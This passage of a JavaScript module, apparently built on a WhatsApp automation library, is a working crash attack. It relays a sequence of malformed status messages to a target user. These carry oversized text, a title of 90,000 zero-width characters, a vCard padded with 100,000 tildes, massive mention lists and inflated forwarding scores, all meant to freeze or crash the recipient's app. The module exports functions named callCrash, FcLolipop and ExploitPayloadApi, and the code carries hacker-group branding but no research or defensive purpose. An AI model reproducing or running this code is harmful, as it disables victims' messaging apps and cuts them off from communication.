          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
          mimetype: "image/webp", fileLength: 12260, mediaKeyTimestamp: "1743832131",
          contextInfo: { 
            mentionedJid: mentionedJidBase,
            quotedMessage: { paymentInviteMessage: { serviceType: 3, expiryTimestamp: Date.now() + 1814400000 }}
          }
        }
    }, {});
    await sock.relayMessage(isTarget, {
        groupStatusMessageV2: { message: Msg4.message },
        }, ptcp ? 
        { messageId: Msg4.key.id, participant: { jid: isTarget } } : { messageId: Msg4.key.id }
    );

    const Msg5 = generateWAMessageFromContent(isTarget, {
        extendedTextMessage: {
          text: "�?".repeat(555555),
            contextInfo: {
              participant: isTarget,
              mentionedJid: mentionedJidBase
            }
        }
    }, {});
    await sock.relayMessage(isTarget, {
        groupStatusMessageV2: { message: Msg5.message },
        }, ptcp ? 
        { messageId: Msg5.key.id, participant: { jid: isTarget } } : { messageId: Msg5.key.id }
    );
    
    const Msg6 = generateWAMessageFromContent(isTarget, {
        videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXr4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4", fileLength: "1515940", seconds: 14,
            contextInfo: { isSampled: true, mentionedJid: [isTarget] },
            forwardedNewsletterMessageInfo: { newsletterJid: "120363321780343299@newsletter", serverMessageId: 1, newsletterName: "FLOWX :: 404.ΣXΣ" },
        }
    }, {});
    await sock.relayMessage(isTarget, {
        groupStatusMessageV2: { message: Msg6.message },
        }, ptcp ? 
        { messageId: Msg6.key.id, participant: { jid: isTarget } } : { messageId: Msg6.key.id }
    );
    
    const Msg7 = generateWAMessageFromContent(isTarget, {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg", fileLength: "389948", seconds: 24, caption: "FLOWX :: 404.ΣXΣ",
        }
    }, {});
    await sock.relayMessage(isTarget, {
        groupStatusMessageV2: { message: Msg7.message },
        }, ptcp ? 
        { messageId: Msg7.key.id, participant: { jid: isTarget } } : { messageId: Msg7.key.id }
    );

    const Msg8 = generateWAMessageFromContent(isTarget, {
        imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg", caption: "FLOWX :: 404.ΣXΣ", fileLength: "19769",
            contextInfo: {
                mentionedJid: mentionedJidSuperMasif,
                isSampled: true, participant: isTarget, remoteJid: "status@broadcast", forwardingScore: 9741, isForwarded: true
            }
        }
    }, {});
    await sock.relayMessage(isTarget, {
        groupStatusMessageV2: { message: Msg8.message },
        }, ptcp ? 
        { messageId: Msg8.key.id, participant: { jid: isTarget } } : { messageId: Msg8.key.id }
    );
    
    const ImgMessage = generateWAMessageFromContent(isTarget, {
        imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg", fileLength: "289511", caption: "MΣXX :: 404.ΣXΣ",
            contextInfo: { isSampled: true, mentionedJid: ["628123456789@s.whatsapp.net"] },
            forwardedNewsletterMessageInfo: { newsletterJid: "120363321780343299@newsletter", serverMessageId: 2, newsletterName: "FLOWX :: 404.ΣXΣ" },
            annotations: [{
              embeddedContent: {
                embeddedMusic: {
                  musicContentMediaId: "589608164114572", songId: "870166291800509", author: "MΣXX :: 404.ΣXΣ", title: "MΣXX :: 404.ΣXΣ",
                  artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                  artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
                }
              },
              embeddedAction: true
            }]
        }
      }, 
      { ephemeralExpiration: 0, forwardingScore: 12000, isForwarded: true }
    );
    await sock.relayMessage(isTarget, {
      groupStatusMessageV2: { message: ImgMessage.message },
      }, { messageId: ImgMessage.key.id }
    );
  
  const MsgDocument = generateWAMessageFromContent(isTarget, {
      documentMessage: {
          url: "https://www.google.com/", 
          mimetype: "text/plain",
          title: "\u200b".repeat(90000), 
          fileLength: "1", pageCount: 1, mediaKey: "A1B2C3D4E5F6G7H8",
          contextInfo: {
              mentionedJid: mentionedJidSuperMasif, 
              forwardingScore: 100000,
          }
      }
  }, {});
  await sock.relayMessage(isTarget, {
      groupStatusMessageV2: { message: MsgDocument.message },
      }, ptcp ? 
      { messageId: MsgDocument.key.id, participant: { jid: isTarget } } : { messageId: MsgDocument.key.id }
  );

  const MsgContact = generateWAMessageFromContent(isTarget, {
    contactMessage: {
      displayName: "LOLIPOP :: 404.ΣXΣ",
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${"~".repeat(100000)};;;\nFN:MΣXX :: 404.ΣXΣ\nEND:VCARD`,
      contextInfo: {
        mentionedJid: mentionedJidBase,
        remoteJid: "status@broadcast",
        forwardingScore: 999999999,
      }
    }
  }, { ephemeralExpiration: 0, forwardingScore: 9741, isForwarded: true });
  
  await sock.relayMessage(isTarget, {
      groupStatusMessageV2: { message: MsgContact.message },
      }, ptcp ? 
      { messageId: MsgContact.key.id, participant: { jid: isTarget } } : { messageId: MsgContact.key.id }
  );

}


module.exports = { FcLolipop, FcLeoPayx, IndicatedFc, DelayDuration, callCrash, exoticsIPV2, ExploitPayloadApi }